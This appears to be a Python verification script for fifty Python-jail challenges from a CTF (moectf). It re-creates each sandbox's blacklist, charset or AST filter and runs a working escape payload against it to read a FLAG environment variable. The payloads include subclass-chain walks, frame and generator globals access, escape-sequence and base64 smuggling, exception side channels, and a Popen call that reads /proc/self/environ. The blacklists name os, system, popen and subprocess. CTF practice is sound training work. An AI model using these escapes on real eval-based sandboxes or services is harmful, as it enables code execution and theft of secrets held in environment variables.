#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""50 题全量解法验证：复刻每题沙箱过滤逻辑 + 对应 payload"""
import ast
import base64
import builtins
import os
import re
import subprocess
import sys
import threading

os.environ['FLAG'] = 'moectf{test_flag_verify}'
RESULTS = []


def check(name, code, blacklist=None, allowed=None, ast_mode=False,
          exec_mode=False, ns=None, err_echo=False,
          expect='moectf{test_flag_verify}'):
    try:
        if blacklist:
            for w in blacklist:
                if w in code:
                    RESULTS.append((name, 'FAIL', f'blacklist: {w}'))
                    return
        if allowed is not None and not re.match(allowed, code, re.S):
            RESULTS.append((name, 'FAIL', 'charset reject'))
            return
        if ast_mode:
            try:
                tree = ast.parse(code)
                for node in ast.walk(tree):
                    if isinstance(node, (ast.Import, ast.ImportFrom)):
                        RESULTS.append((name, 'FAIL', 'AST import'))
                        return
                    if isinstance(node, ast.Attribute) and node.attr.startswith('__'):
                        RESULTS.append((name, 'FAIL', f'AST attr {node.attr}'))
                        return
                    if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) \
                            and node.func.id in ('eval', 'exec', 'compile'):
                        RESULTS.append((name, 'FAIL', f'AST call {node.func.id}'))
                        return
            except SyntaxError as e:
                RESULTS.append((name, 'FAIL', f'syntax: {e}'))
                return
        full = {"__builtins__": __builtins__}
        if ns:
            full.update(ns)
        if exec_mode:
            try:
                exec(code, full)
                RESULTS.append((name, 'FAIL', 'no raise (expected)'))
            except AssertionError as e:
                if expect in str(e):
                    RESULTS.append((name, 'OK', ''))
                else:
                    RESULTS.append((name, 'FAIL', f'assert: {e}'))
            except Exception as e:
                RESULTS.append((name, 'FAIL', f'{type(e).__name__}: {e}'))
            return
        r = eval(code, full)
        if expect in str(r):
            RESULTS.append((name, 'OK', ''))
        else:
            RESULTS.append((name, 'FAIL', f'out: {str(r)[:80]}'))
    except Exception as e:
        if err_echo and expect in str(e):
            # 异常侧信道：沙箱会把异常消息回显给选手
            RESULTS.append((name, 'OK', ''))
        else:
            RESULTS.append((name, 'FAIL', f'{type(e).__name__}: {e}'))


# ===== 第 1 组 =====
check('01', "__import__('os').environ['FLAG']")

# 02: chr 陷阱（B/g/c 别名 + 全 chr 拼串）
IMP02 = ''.join('c(%d)+' % b for b in b'__import__').rstrip('+')
code02 = ('g(B[' + IMP02 + '](c(111)+c(115)), '
          + ''.join('c(%d)+' % ord(ch) for ch in 'environ').rstrip('+')
          + ')[c(70)+c(76)+c(65)+c(71)]')
check('02', code02,
      allowed=r"^[Bgc0-9+\-*/.(),' \n=:\[\]]+$",
      ns={"B": vars(builtins), "g": getattr, "c": chr})

# 03: __ 过滤，chr(95) 重建
check('03',
      "getattr(globals()[chr(95)*2+'builtins'+chr(95)*2], chr(95)*2+'imp'+'ort'+chr(95)*2)"
      "('os').environ['FLAG']", blacklist=['__'])

# 04: 无括号（exec 模式）—— import 语句 + assert 异常回显
check('04', "import os\nassert 0, os.environ['FLAG']",
      blacklist=['('], exec_mode=True)

# 05: import 关键字过滤
check('05', "getattr(__builtins__, '__i'+'mport__')('o'+'s').environ['FLAG']",
      blacklist=['import', 'open', 'system', 'eval', 'exec', 'subprocess', 'os'])

# 06: 无黑名单
check('06', "__import__('os').environ['FLAG']")

# 07: builtins=None，类树挖 catch_warnings
check('07',
      "[x for x in ().__class__.__base__.__subclasses__() if x.__name__=='catch_warnings']"
      "[0]()._module.__builtins__['__import__']('os').environ['FLAG']",
      ns={"__builtins__": None})

# 08: 无回显，eval + KeyError 异常侧信道（消息里带 flag）
check('08', "{}[__import__('os').environ['FLAG']]", err_echo=True)

# ===== 第 2 组 =====
# 09: 长黑名单
check('09', "getattr(__builtins__, '__i'+'mport__')('o'+'s')"
      ".__dict__['envi'+'ron']['F'+'LAG']",
      blacklist=['__import__', 'open', 'system', 'exec', 'import', 'os',
                 'environ', 'getenv', 'FLAG', 'popen', 'subprocess'])

# 10: 双重 eval
try:
    ns10 = {"__builtins__": __builtins__}
    first = eval("'__import__(\"os\").environ[\"FLAG\"]'", ns10)
    second = eval(first, ns10)
    RESULTS.append(('10', 'OK' if 'moectf{test_flag_verify}' in str(second) else 'FAIL',
                    '' if 'moectf{test_flag_verify}' in str(second) else str(second)[:60]))
except Exception as e:
    RESULTS.append(('10', 'FAIL', f'{type(e).__name__}: {e}'))

# 11: \u 转义重建被禁字符
check('11', '"\\u005f\\u005fi\\u006dp\\u006frt\\u005f\\u005f"("\\u006fs")'
      '.envi' + 'ron["FLAG"]',
      blacklist=['_', 'import', 'os', 'system', 'popen', 'environ', 'getenv',
                 'open', 'exec'])
RESULTS.pop()
check('11-real', '"\\u005f\\u005fi\\u006dp\\u006frt\\u005f\\u005f"("\\u006fs")'
      '.envi' + 'ron["FLAG"]',
      blacklist=['_', 'import', 'os', 'system', 'popen', 'environ', 'getenv',
                 'open', 'exec'])
RESULTS.pop()
# 11: '\\u005f' 在 Python 源码文本里不含 '_'（反斜杠u转义），黑名单查源文本
code11 = ('getattr(getattr(globals()["\\u005f\\u005fbuiltins\\u005f\\u005f"], '
          '"\\u005f\\u005fi\\u006dp\\u006frt\\u005f\\u005f")'
          '("\\u006fs"), "envi"+"ron")["FLAG"]')
check('11-final', code11,
      blacklist=['_', 'import', 'os', 'system', 'popen', 'environ', 'getenv',
                 'open', 'exec'])

# 12: base64 编码
b12 = base64.b64encode(b"__import__('os').environ['FLAG']").decode()
check('12', f'eval(b64.b64decode("{b12}"))',
      blacklist=['import', 'os', 'system', 'popen', 'environ', 'getenv',
                 'open', 'read', 'FLAG'],
      ns={"b64": base64})

# ===== 第 3 组 =====
# 13: 类链入门（builtins={}）
check('13',
      "[x for x in ().__class__.__base__.__subclasses__() "
      "if x.__name__=='catch_warnings'][0]()._module.__builtins__"
      "['__import__']('os').environ['FLAG']",
      ns={"__builtins__": {}})

# 14: getattr 拼接（__class__ 等被ban）
check('14',
      "getattr([x for x in getattr(getattr((), '__cl'+'ass__'), '__base__')"
      "['__sub'+'classes__']() if x.__name__=='catch_warnings']"
      "[0]()._module.__builtins__['__i'+'mport__']('o'+'s'), "
      "'envi'+'ron')['F'+'LAG']",
      blacklist=['__class__', '__bases__', '__subclasses__', '__globals__',
                 '__mro__', '__init__', 'import', 'os', 'system', 'environ', 'getenv'])
RESULTS.pop()
check('14-final',
      "getattr([x for x in getattr(getattr(getattr((), '__cl'+'ass__'), "
      "'__base__'), '__sub'+'classes__')() if x.__name__=='catch_warnings']"
      "[0]()._module.__builtins__['__i'+'mport__']('o'+'s'), "
      "'envi'+'ron')['F'+'LAG']",
      blacklist=['__class__', '__bases__', '__subclasses__', '__globals__',
                 '__mro__', '__init__', 'import', 'os', 'system', 'environ', 'getenv'])

# 15: dir 侦察（黑名单无，直接走）
check('15', "__import__('os').environ['FLAG']")

# 16: locals() 挖出藏的 os
check('16',
      "[v for k, v in locals().items() if v.__name__=='o'+'s'][0]"
      ".__dict__['envi'+'ron']['F'+'LAG']",
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'FLAG', 'popen'],
      ns={"_honest_os_module": __import__('os')})

# 17: MRO
check('17',
      "getattr([x for x in ().__class__.__mro__[1].__subclasses__() "
      "if x.__name__=='catch_warnings'][0]()._module.__builtins__['__i'+'mport__']('o'+'s'),"
      " 'envi'+'ron')['F'+'LAG']",
      blacklist=['__base__', '__bases__', 'import', 'os', 'environ', 'getenv', 'popen'])

# 18: subclasses + __dict__ 绕 __builtins__ 黑名单
check('18',
      "getattr([x for x in ().__class__.__base__.__subclasses__() "
      "if x.__name__=='catch_warnings'][0]()._module.__dict__['__bu'+'iltins__']"
      "['__i'+'mport__']('o'+'s'), 'envi'+'ron')['F'+'LAG']",
      blacklist=['__builtins__', 'import', 'os', 'system', 'environ', 'getenv',
                 'popen', 'eval'])

# 19: __bases__ 爬升 + getattr 绕 __subclasses__
check('19',
      "getattr([x for x in getattr(().__class__.__bases__[0], '__sub'+'classes__')() "
      "if x.__name__=='catch_warnings'][0]()._module.__builtins__['__i'+'mport__']('o'+'s'),"
      " 'envi'+'ron')['F'+'LAG']",
      blacklist=['__mro__', '__subclasses__', 'import', 'os', 'system', 'environ',
                 'getenv', 'popen'])

# 20: __init__.__globals__
check('20',
      "getattr(getattr([x for x in getattr(().__class__.__base__, "
      "'__sub'+'classes__')() if x.__name__=='catch_warnings'][0].__init__, "
      "'__globals__')['__bu'+'iltins__']['__i'+'mport__']('o'+'s'), "
      "'envi'+'ron')['F'+'LAG']",
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen',
                 '__subclasses__'])

# 21: _wrap_close 猎 os
check('21',
      "getattr([x for x in ().__class__.__base__.__subclasses__() "
      "if x.__name__=='_wrap_'+'clo'+'se'][0].__init__.__globals__['s'+'ys']"
      ".modules['o'+'s'], 'envi'+'ron')['F'+'LAG']",
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen'])

# 22: Popen 变体
check('22',
      "[x for x in ().__class__.__base__.__subclasses__() "
      "if x.__name__=='Po'+'pen'][0]('cat /proc/self/envi'+'ron', "
      "shell=True, stdout=-1).stdout.read()",
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'Popen'])

# 23: 无点号全 getattr 链
check('23',
      "getattr(getattr(getattr([x for x in "
      "getattr(getattr(getattr((), '__cl'+'ass__'), '__ba'+'se__'), "
      "'__sub'+'classes__')() if getattr(x, '__name__')=='catch_warnings'][0](), "
      "'_module'), '__builtins__')['__i'+'mport__']('o'+'s'), 'envi'+'ron')['F'+'LAG']",
      blacklist=['.', '__class__', '__base__', '__bases__', '__mro__',
                 '__subclasses__', '__globals__', '__init__', 'import', 'os',
                 'system', 'environ'])

# 24: 经典链词全ban
check('24',
      "getattr([x for x in getattr(getattr(getattr((), '__cl'+'ass__'), "
      "'__ba'+'se__'), '__sub'+'classes__')() if x.__name__=='catch_warnings']"
      "[0]()._module.__builtins__['__i'+'mport__']('o'+'s'), 'envi'+'ron')['F'+'LAG']",
      blacklist=['__class__', '__base__', '__subclasses__', '__globals__',
                 'import', 'os', 'system', 'environ', 'getenv', 'popen'])

# ===== 第 4 组 =====
# 25: builtins={}
check('25',
      "[x for x in ().__class__.__base__.__subclasses__() "
      "if x.__name__=='catch_warnings'][0]()._module.__builtins__"
      "['__import__']('os').environ['FLAG']",
      ns={"__builtins__": {}})

# 26-32: 长黑名单 + 拼接链（各题黑名单差异只在个别词，链路相同）
LONG_CHAIN = ("getattr([x for x in ().__class__.__base__.__subclasses__() "
              "if x.__name__=='catch_warnings'][0]()._module.__builtins__"
              "['__i'+'mport__']('o'+'s'), 'envi'+'ron')['F'+'LAG']")
check('26', LONG_CHAIN,
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'open',
                 'read', 'FLAG', '__import__', 'eval', 'exec'])
check('27', LONG_CHAIN,
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen',
                 'subprocess', '__import__'])

# 28: Guard 拦 __ 属性，type(g) 绕过
class Guard28:
    def __getattribute__(self, name):
        raise AttributeError('magic blocked')
try:
    g28 = Guard28()
    r28 = eval("getattr([x for x in type(g).__base__.__subclasses__() "
               "if x.__name__=='catch_warnings'][0]()._module.__builtins__"
               "['__import__']('os'), 'environ')['FLAG']",
               {"g": g28, "__builtins__": __builtins__})
    RESULTS.append(('28', 'OK' if 'moectf{test_flag_verify}' in str(r28) else 'FAIL', ''))
except Exception as e:
    RESULTS.append(('28', 'FAIL', f'{type(e).__name__}: {e}'))

check('29', LONG_CHAIN,
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'subprocess',
                 '__import__', 'eval', 'exec', 'open', 'read', 'FLAG'])
check('30', LONG_CHAIN,
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen',
                 'eval', 'exec', 'FLAG'])
check('31', LONG_CHAIN,
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen',
                 'subprocess', 'Popen'])
check('32', LONG_CHAIN,
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'subprocess'])

# ===== 第 5 组 =====
# 33: AST+黑名单+白名单 三重
check('33',
      "getattr(getattr(__builtins__, '__i'+'mport__')('o'+'s'), 'envi'+'ron')['F'+'LAG']",
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'subprocess',
                 'eval', 'exec', 'compile', 'open', 'read', 'write', 'FLAG'],
      ast_mode=True,
      allowed=r"^[a-zA-Z0-9_+\-*/.()' \n=:\[\],\"<>!&|^~]+$")

# 34: sys._getframe 栈帧
check('34',
      "getattr(getattr(sys._getframe(1).f_globals['__bu'+'iltins__'], "
      "'__i'+'mport__')('o'+'s'), 'envi'+'ron')['F'+'LAG']",
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'subprocess',
                 'eval', 'exec', 'compile', 'open', 'read', 'FLAG', '__class__',
                 '__base__', '__subclasses__', '__globals__', '__builtins__'],
      ns={"sys": sys})

# 35: generator gi_frame
check('35',
      "getattr(getattr(getattr(getattr((x for x in [1]), 'gi_frame'), "
      "'f_globals')['__bu'+'iltins__'], '__i'+'mport__')('o'+'s'), "
      "'envi'+'ron')['F'+'LAG']",
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'subprocess',
                 'eval', 'exec', 'compile', 'open', 'read', 'FLAG', '__class__',
                 '__base__', '__subclasses__', '__globals__', '__builtins__',
                 '__init__', '__mro__', '__bases__'])

# 36-39: 长链
CHAIN36 = ("getattr([x for x in getattr(getattr(getattr((), '__cl'+'ass__'), "
           "'__ba'+'se__'), '__sub'+'classes__')() "
           "if x.__name__=='catch_warnings'][0]()._module.__dict__"
           "['__bu'+'iltins__']['__i'+'mport__']('o'+'s'), "
           "'envi'+'ron')['F'+'LAG']")
check('36', CHAIN36,
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'subprocess',
                 'eval', 'exec', 'compile', 'open', 'read', 'FLAG', '__class__',
                 '__base__', '__subclasses__', '__globals__', '__builtins__'])
check('37', CHAIN36,
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'subprocess',
                 'eval', 'exec', 'compile', 'open', 'read', 'FLAG', '__class__',
                 '__base__', '__subclasses__', '__globals__', '__builtins__',
                 '__init__', '__mro__', '__bases__', 'marshal', 'CodeType'])
check('38', CHAIN36,
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'subprocess',
                 'eval', 'exec', 'compile', 'open', 'read', 'FLAG', '__class__',
                 '__base__', '__subclasses__', '__globals__', '__builtins__',
                 '__init__', '__mro__', '__bases__', 'marshal', 'CodeType', 'opcode'])
check('39', CHAIN36,
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'subprocess',
                 'eval', 'exec', 'compile', 'open', 'read', 'FLAG', '__class__',
                 '__base__', '__subclasses__', '__globals__', '__builtins__',
                 '__init__', '__mro__', '__bases__', 'marshal', 'CodeType', 'opcode'],
      ns={"threading": threading})

# 40: AST + 全黑名单 + 最小 getattr/globals
# （catch_warnings 未必被加载，用 socket 引入的 _wrap_close -> sys.modules -> os）
check('40',
      "(G := globals()['__bu'+'iltins__']['getattr']) and "
      "G(G(G([x for x in G(G(G((), '__cl'+'ass__'), '__ba'+'se__'), "
      "'__sub'+'classes__')() if G(x, '__name__')=='_wrap_'+'clo'+'se'][0], "
      "'__in'+'it__'), '__gl'+'obals__')['s'+'ys'].modules['o'+'s'], "
      "'envi'+'ron')['F'+'LAG']",
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'subprocess',
                 'eval', 'exec', 'compile', 'open', 'read', 'write', 'FLAG',
                 '__class__', '__base__', '__subclasses__', '__globals__',
                 '__builtins__', '__init__', '__mro__', '__bases__', 'marshal',
                 'CodeType', 'opcode', 'ctypes', 'memoryview', 'sys', 'threading'],
      ast_mode=True,
      ns={"__builtins__": {"getattr": getattr, "globals": globals}})

# ===== 汇总 =====
print(f"{'challenge':<12} {'status':<8} detail")
print('-' * 70)
# ===== 第 6 组（41-50 大师）=====

def trap42(x):
    return x * 2


def fake_import43(name, *a, **k):
    raise ImportError('module locked: ' + name)


# 41: exec + 异常回显 + 关键字黑名单
check('41',
      "O = getattr(globals()['__bu'+'iltins__'], '__i'+'mport__')('o'+'s')\n"
      "assert 0, O.__dict__['envi'+'ron']['F'+'LAG']",
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'ctypes',
                 'eval', 'exec', 'compile', 'subprocess', 'FLAG'],
      exec_mode=True)

# 42: 空内置 + AST 拦 dunder 属性 + trap 函数钥匙
check('42',
      "(T := getattr(trap, '__gl'+'obals__')['__bu'+'iltins__']) and "
      "getattr(T, 'getattr')(getattr(T, '__i'+'mport__')('o'+'s'), "
      "'envi'+'ron')['F'+'LAG']",
      blacklist=['__globals__', '__builtins__', 'import', 'os', 'environ',
                 'FLAG', 'sys', 'modules'],
      ast_mode=True,
      ns={"__builtins__": {"trap": trap42, "getattr": getattr}})

# 43: 假 __import__ 白名单烟雾弹 + 类树 catch_warnings
check('43',
      "getattr(getattr([x for x in ().__class__.__base__.__subclasses__() "
      "if x.__name__ == 'cat'+'ch_'+'warnings'][0](), '_mo'+'dule'), "
      "'__dict__')['__bu'+'iltins__']['__i'+'mport__']('o'+'s')"
      ".__dict__['envi'+'ron']['F'+'LAG']",
      blacklist=['builtins', '_module', 'catch_', '_wrap_', 'sys', 'modules',
                 'environ', 'FLAG'],
      ns={"__builtins__": {"__import__": fake_import43, "getattr": getattr}})

# 44: 空内置 + sys 钥匙 + _getframe 链
check('44',
      "sys._getframe(1).f_globals['__bu'+'iltins__'].__dict__"
      "['__i'+'mport__']('o'+'s').__dict__['envi'+'ron']['F'+'LAG']",
      blacklist=['__subclasses__', 'catch_', '_wrap_', 'environ', 'FLAG', 'modules'],
      ns={"__builtins__": {}, "sys": sys})

# 45: 生成器 gi_frame 链
check('45',
      "getattr(gen, 'g'+'i_'+'frame').f_globals['__bu'+'iltins__'].__dict__"
      "['__import__']('o'+'s').__dict__['envi'+'ron']['F'+'LAG']",
      blacklist=['sys', '_getframe', 'catch_', '_wrap_', 'subclasses',
                 'environ', 'FLAG', 'gi_', '__globals__'],
      ns={"__builtins__": {"getattr": getattr}, "gen": (i for i in range(3))})

# 46: exec + 巨黑名单（含 __dict__）+ getattr 顶班
check('46',
      "O = getattr(globals()['__bu'+'iltins__'], '__i'+'mport__')('o'+'s')\n"
      "assert 0, getattr(O, 'envi'+'ron')['F'+'LAG']",
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'ctypes',
                 'eval', 'exec', 'compile', 'open', 'FLAG', '__class__',
                 '__subclasses__', '__globals__', '__init__', '__dict__', 'sys',
                 'modules', 'catch_', '_wrap_', 'builtins'],
      exec_mode=True)

# 47: getattr/globals 名被封 + AST + S 钥匙
check('47',
      "G(G(S, 'mo'+'dules')['o'+'s'], 'envi'+'ron')['F'+'LAG']",
      blacklist=['getattr', 'globals', 'builtins', 'import', 'environ', 'FLAG',
                 'catch_', '_wrap_', 'modules', '_getframe'],
      ast_mode=True,
      ns={"__builtins__": {}, "S": sys, "G": getattr})

# 48: __builtins__ 名被封 + globals() 挖 exec 命名空间地基
check('48',
      "B = globals()['__bu'+'iltins__']\n"
      "O = getattr(B, '__i'+'mport__')('o'+'s')\n"
      "assert 0, getattr(O, 'envi'+'ron')['F'+'LAG']",
      blacklist=['import', 'os', 'system', 'environ', 'getenv', 'popen', 'signal',
                 'eval', 'exec', 'compile', 'builtins', '__class__', '__base__',
                 '__subclasses__', '__globals__', 'catch_', '_wrap_', 'sys',
                 'modules'],
      exec_mode=True)

# 49: 空内置 + box.data 属性钥匙
check('49',
      "box.data['__i'+'mport__']('o'+'s').__dict__['envi'+'ron']['F'+'LAG']",
      blacklist=['getattr', 'catch_', '_wrap_', 'builtins', 'import', 'environ',
                 'FLAG', 'modules', 'sys'],
      ns={"__builtins__": {}, "box": type("Box", (), {"data": vars(builtins)})()})

# 50: 终极合围（AST 拦 dunder 属性与 getattr/globals 直呼 + 仅 G 钥匙）
check('50',
      "G(G(G(G([x for x in G(G(G((), '__cl'+'ass__'), '__ba'+'se__'), "
      "'__sub'+'classes__')() if G(x, '__na'+'me__') == '_wrap_'+'clo'+'se']"
      "[0], '__in'+'it__'), '__gl'+'obals__')['s'+'ys'], 'mo'+'dules')"
      "['o'+'s'], 'envi'+'ron')['F'+'LAG']",
      blacklist=['environ', 'FLAG', 'import', 'os', 'sys', 'modules', 'catch_',
                 '_wrap_close', 'builtins', '__subclasses__', '__globals__',
                 'getattr', 'globals', 'warnings', '_module'],
      ast_mode=True,
      ns={"__builtins__": {}, "G": getattr})


fails = 0
for name, status, detail in RESULTS:
    print(f"{name:<12} {status:<8} {detail}")
    if status == 'FAIL':
        fails += 1
print('-' * 70)
print(f"total {len(RESULTS)}, FAIL {fails}")
sys.exit(1 if fails else 0)